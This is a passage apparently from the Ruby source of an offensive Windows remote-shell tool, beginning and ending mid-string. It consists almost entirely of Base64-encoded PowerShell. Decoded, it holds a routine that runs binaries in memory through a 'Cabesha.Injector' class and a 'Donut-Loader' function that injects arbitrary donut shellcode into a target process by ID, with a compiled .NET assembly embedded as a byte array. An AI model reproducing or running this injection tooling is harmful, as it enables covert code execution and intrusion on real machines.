AwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMTIsIDAsIDAsIDAsIDk2LCA1NywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCkpIHwgb3V0LW51bGwgCiRiaW5hcmlvICA9ICRhcmcuc3BsaXQoIiAsIilbMF0KJGFyZyA9ICRhcmcuUmVwbGFjZSgiJGJpbmFyaW8gIiwiIikuc3BsaXQoIiwiKSB8IFNlbGVjdC1PYmplY3QgLVNraXAgMQokYXJndW1lbnRvcyA9ICRiaW5hcmlvCmZvcmVhY2ggKCRhcmd1bWVudG8gaW4gJGFyZykgewpbYXJyYXldJGFyZ3VtZW50b3MgKz0gJGFyZ3VtZW50bwoKfQpbQ2FiZXNoYS5JbmplY3Rvcl06OkV4ZWN1dGUoJGFyZ3VtZW50b3MpfQp9')
    donuts = Base64.decode64('ZnVuY3Rpb24gRG9udXQtTG9hZGVyIHtwYXJhbSgkcHJvY2Vzc19pZCwkZG9udXRmaWxlKQogICAgJGhlbHA9QCIKLlNZTk9QU0lTCiAgICBEb251dCBMb2FkZXIuCiAgICBQb3dlclNoZWxsIEZ1bmN0aW9uOiBEb251dC1Mb2FkZXIKICAgIEF1dGhvcjogTHVpcyBWYWNhcyAoQ3liZXJWYWNhKQogICAgQmFzZWQgY29kZTogVGhlV292ZXIKCiAgICBSZXF1aXJlZCBkZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIGRlcGVuZGVuY2llczogTm9uZQouREVTQ1JJUFRJT04KICAgIAouRVhBTVBMRQogICAgRG9udXQtTG9hZGVyIC1wcm9jZXNzX2lkIDIxOTUgLWRvbnV0ZmlsZSAvaG9tZS9jeWJlcnZhY2EvZG9udXQuYmluCiAgICBEb251dC1Mb2FkZXIgLXByb2Nlc3NfaWQgKGdldC1wcm9jZXNzIG5vdGVwYWQpLmlkIC1kb251dGZpbGUgL2hvbWUvY3liZXJ2YWNhL2RvbnV0LmJpbgoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkcyBhbiBhcmJpdHJhcnkgZG9udXQgOkQKIkAKaWYgKCRwcm9jZXNzX2lkIC1lcSAkbnVsbCAtb3IgJGRvbnV0ZmlsZSAtZXEgJG51bGwpIHt3cml0ZS1ob3N0ICIkaGVscGBuIn0gZWxzZSAKewppZiAoKFtJbnRQdHJdOjpTaXplKSAtZXEgNCkge3dyaXRlLWhvc3QgIlNvcnJ5LCB0aGlzIGZ1bmN0aW9uIG9ubHkgd29yayBvbiB4NjQgOigiOyBicmVha30KW2J5dGVbXV0kYnl0ZXMgPSA3NywgOTAsIDE0NCwgMCwgMywgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMjU1LCAyNTUsIDAsIDAsIDE4NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMTQsIDMxLCAxODYsIDE0LCAwLCAxODAsIDksIDIwNSwgMzMsIDE4NCwgMSwgNzYsIDIwNSwgMzMsIDg0LCAxMDQsIDEwNSwgMTE1LCAzMiwgMTEyLCAxMTQsIDExMSwgMTAzLCAxMTQsIDk3LCAxMDksIDMyLCA5OSwgOTcsIDExMCwgMTEwLCAxMTEsIDExNiwgMzIsIDk4LCAxMDEsIDMyLCAxMTQsIDExNywgMTEwLCAzMiwgMTA1LCAxMTAsIDMyLCA2OCwgNzksIDgzLCAzMiwgMTA5LCAxMTEsIDEwMCwgMTAxLCA0NiwgMTMsIDEzLCAxMCwgMzYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDgwLCA2OSwgMCwgMCwgMTAwLCAxMzQsIDIsIDAsIDQxLCA2NCwgMTM5LCA5MywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjQwLCAwLCAzNCwgMzIsIDExLCAyLCAxMSwgMCwgMCwgMTYsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAxNiwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTYsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAzLCAwLCA5NiwgMTMzLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA4OCwgMywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjAsIDQ1LCAwLCAwLCAyOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDcyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0NiwgMTE2LCAxMDEsIDEyMCwgMTE2LCAwLCAwLCAwLCA3NiwgMTQsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCA5NiwgNDYsIDExNCwgMTE1LCAxMTQsIDk5LCAwLCAwLCAwLCA4OCwgMywgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY0LCA0NiwgMTE0LCAxMDEsIDEwOCwgMTExLCA5OSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQ4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNjYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsID